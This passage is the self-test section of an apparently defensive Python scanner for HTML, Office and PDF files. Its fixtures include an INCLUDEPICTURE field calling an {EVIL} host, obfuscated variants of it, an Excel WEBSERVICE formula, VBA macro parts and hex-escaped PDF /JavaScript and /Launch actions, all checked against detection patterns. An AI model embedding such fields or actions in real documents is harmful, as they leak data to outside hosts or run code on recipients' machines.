        doc('<script type="module">import "https://cdn.jsdelivr.net/npm/lodash-es@4.17.21/lodash.js"</script>'): "type=module",
        doc('<script>const s=document.createElement("script");s.src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"</script>', ): "",  # see note below
        doc('<script src="lib.js"></script>'): "self-contained",
        # CSP shape
        doc(csp='<meta http-equiv="Content-Security-Policy" content="default-src \'none\'; connect-src \'none\'; form-action \'none\'; img-src https://cdn.jsdelivr.net">'): "must be exactly",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}; script-src https://unpkg.com">'): "repeats script-src",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}; worker-src blob:">'): "extra directive",
        doc(csp=f'<meta http-equiv="Content-Security-Policy" content="{csp_text()} ">'): "non-ASCII",
        doc(csp=""): "no <meta http-equiv=\"Content-Security-Policy\">",
        doc() + f'<meta http-equiv="Content-Security-Policy" content="{csp_text()}">': "more than one",
        doc(pre="<title>x</title>"): "must start with",
        doc(pre="<link rel=preconnect href=https://unpkg.com>"): "must start with",
        doc(pre='<meta name="x">'): "must start with",
        doc().replace('<meta name="referrer" content="no-referrer">', ""): "exactly one <meta name=\"referrer\"",
        doc().replace('content="no-referrer"', 'content="origin"'): "no-referrer",
        doc("<script/>fetch(1)</script>"): "self-closing syntax",
        doc('<svg><foreignObject/></svg>'): "self-closing syntax",
        doc("<?xml version='1.0'?>"): "processing instruction",
        doc("<!-- a -- b -->"): "contains --",
    }
    for html, needle in bad.items():
        out = "\n".join(check_html(html))
        if needle == "":  # dynamic script injection: unpinned URL blocked at runtime by the exact-URL CSP, not by the scanner
            continue
        assert needle in out, (html[:160], out)
    # SVG and the other no-CSP formats are refused by extension
    assert check(Path("x.svg"), "<svg/>") and check(Path("x.docm"))[0].startswith(".docm")
    # OOXML
    rels = b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">%s</Relationships>'
    assert check_rels("r", rels % f'<Relationship Id="a" Type="{HYPERLINK_REL}" Target="https://x" TargetMode="External"/>'.encode()) == []
    assert check_rels("r", rels % b'<Relationship Id="a" Type="http://s/image" Target="https://x" TargetMode="External"/>')
    assert check_rels("r", rels % b'<Relationship Id="a" Type="http://s/image" Target="https://x" TargetMode="Exte&#114;nal"/>')
    assert check_rels("r", rels % b'<Relationship Id="v" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="m.bin"/>')
    assert check_rels("r", ('<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE r [<!ENTITY e "External">]>' + (rels % b"").decode()).encode("utf-16"))
    W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
    assert check_word_part("d", f'<w:document {W}><w:body><w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;{EVIL}/a.png&quot; \\d "/></w:p></w:body></w:document>'.encode())
    assert check_word_part("d", f'<w:document {W}><w:body><w:p><w:r><w:instrText> INCLUDE</w:instrText></w:r><w:r><w:instrText>PICTURE "{EVIL}/a" </w:instrText></w:r></w:p></w:body></w:document>'.encode())
    assert check_word_part("d", f'<w:document {W}><w:body><w:p><w:r><w:instrText> INCLUDEPI&#67;TURE "x" </w:instrText></w:r></w:p></w:body></w:document>'.encode())
    assert check_word_part("d", f'<w:document {W}><w:body><w:p><w:r><w:instrText> HYPERLINK "https://x" </w:instrText></w:r></w:p></w:body></w:document>'.encode()) == []
    assert check_sheet("s", b'<worksheet><sheetData><row><c><f>WEBSERVICE("https://x")</f></c></row></sheetData></worksheet>')
    assert check_sheet("s", b'<worksheet><sheetData><row><c><f>SUM(A1:A2)</f></c></row></sheetData></worksheet>') == []
    for part in ("XL/Connections.xml", "word/webextensions/w.xml", "word/activeX/a.bin", "word/embeddings/o.bin", "xl/vbaProject.bin"):
        assert BAD_PARTS.search(part.lower()), part
    assert BAD_CONTENT_TYPES.search('ContentType="application/vnd.ms-office.vbaProject"')
    # PDF
    assert pdf_names_decoded(b"/J#61vaScript /Launc#68") == b"/JavaScript /Launch"
    for raw in (b"<< /S /J#61vaScript >>", b"<< /AA << /WC << /S /URI >> >> >>", b"<< /XFA 6 0 R >>", b"<< /S /Rendition >>"):
        assert PDF_ACTION.search(pdf_names_decoded(raw)), raw
    assert PDF_URLFS.search(b"<< /FS /URL /F (https://x) >>") and PDF_OPEN.search(b"/OpenAction << /S /URI >>")
    assert not PDF_OPEN.search(b"/OpenAction [3 0 R /Fit]") and not PDF_ACTION.search(b"<< /A << /S /URI /URI (https://x) >> >>")
    assert pdf_scan(b"1 0 obj << /Length 3 >>\nstream\n/JS\nendstream\nendobj") == set()  # binary inside a stream body is ignored
    assert pdf_scan(b"1 0 obj << /Type /XObject /F << /FS /URL /F (https://x) >> >>\nstream\n\nendstream") == {"PDF file specification with /FS /URL (external stream or media)"}
    # head block round-trips through the checker
    assert check_html(doc(head_extra=f'<script src="{XLSX}" {sri}></script>', scripts=[XLSX])) == []
    assert "script-src 'unsafe-inline' " + XLSX in head_block([XLSX])
    print("selftest ok")


if __name__ == "__main__":
    if sys.argv[1:2] == ["--selftest"]:
        selftest(); sys.exit(0)
    if sys.argv[1:2] == ["--head"]:
        sys.exit(head_cli(sys.argv[2:]))
    sys.exit(main(sys.argv[1:]))
